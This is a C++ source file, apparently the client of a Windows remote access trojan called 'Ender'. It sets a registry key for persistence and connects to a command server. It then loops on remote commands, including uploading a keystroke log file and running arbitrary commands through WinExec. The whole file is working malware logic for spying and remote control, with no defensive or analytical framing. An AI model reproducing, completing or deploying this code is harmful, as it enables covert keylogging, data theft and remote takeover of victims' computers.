#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include "client.h"
#include "main.h"
#include "persistence.h"

#pragma comment (lib, "Ws2_32.lib")

typedef VOID(*SetHook)();

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int nCmdShow)
{
	init_winsock();

	CLIENT client;

	if (!client.CheckRegKey())
	{
		client.SetRegKey();
	}

	client.connect_to_server();
	string command;
	while(true)
	{
		command.assign("");
		if(client.recieve_command(command) == false)
		{
			client.connect_to_server();
		}
		handle_command(client, command);
		Sleep(100);
	}
	return 0;
}

int init_winsock()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	return 0;
}

void handle_command(CLIENT& client, string& command)
{
	if(command.substr(0,5) == "show ")
	{
		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK); // TODO: FIX (client hangs when messagebox is displayed)
	}
	else if(command == "disconnect")
	{
		ExitProcess(0);
	}
	else if(command == "username")
	{
		client.send_username();
	}
	else if(command.substr(0,6) == "speak ")
	{ 
		client.speak_command(command.substr(6));
	}
	else if(command == "dump keylogs")
	{
		client.send_file("C:\\ender\\log.txt");
	}
	else if(command.substr(0,8) == "execute ")
	{
		WinExec(command.substr(8).c_str(), SW_SHOW);
	}
}